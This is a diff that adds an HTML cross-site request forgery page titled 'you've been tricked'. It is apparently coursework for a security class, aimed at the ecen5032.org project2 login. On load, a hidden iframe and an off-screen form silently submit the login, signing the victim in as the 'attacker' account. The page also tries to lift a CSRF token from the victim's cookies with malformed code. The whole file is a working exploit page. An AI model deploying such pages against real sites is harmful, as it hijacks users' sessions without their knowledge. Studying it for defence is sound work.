@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>you've been tricked</title>
+<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
+</head>
+<body>
+<iframe id="ecen" src="http://ecen5032.org" style="visibility: hidden;"></iframe>
+<form name="myForm" id="myForm"  action="http://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0&" target="ecen">
+	<input type="hidden" name="csrf_token" value = document.cookie.split(";")[2].substr(document.cookie.split(";")[2].indexOf("="),document.cookie.split(";")[2].length)/>
+	<input type="hidden" name="username" value="attacker"/>
+	<input type="hidden" name="password" value="l33th4x"/>
+	 <!-- console.log(decodeURIComponent(document.cookie)) -->
+	<input type="submit" style="position: absolute; left: -99999999px;">
+	</form>
+	<script type="text/javascript">
+window.onload = function func(){
+ 	form = document.getElementById('myForm');
+ 	    function postIframe(target_url, method, pform)
+    {
+        //Add iframe
+        var iframe = document.createElement("iframe");
+        document.body.appendChild(iframe);
+        iframe.style.display = "none";
+
+        //Give the frame a name
+        var frame_name = "frame_name" + (new Date).getTime();
+        iframe.contentWindow.name = frame_name;
+        //build the form
+        var form = pform;
+        form.target = frame_name;
+        form.action = target_url;
+        form.method = method;
+        document.body.appendChild(form);
+        form.submit();
+    }
+    postIframe('http://ecen5032.org/project2/login', "POST", form);
+	// form.submit();
+// }
+//  // $(function () {
+     // form.on('submit', function () {
+
+//              $.ajax({
+              //   type: 'POST',
+              //   crossDomain: true,
+              //   url: 'http://ecen5032.org/project2/login',
+              //   data: $(form).serialize()
+              // });
+//           return false;
+//          });
+// // });
+// // };
+}
+</script>
+</body>
+</html>
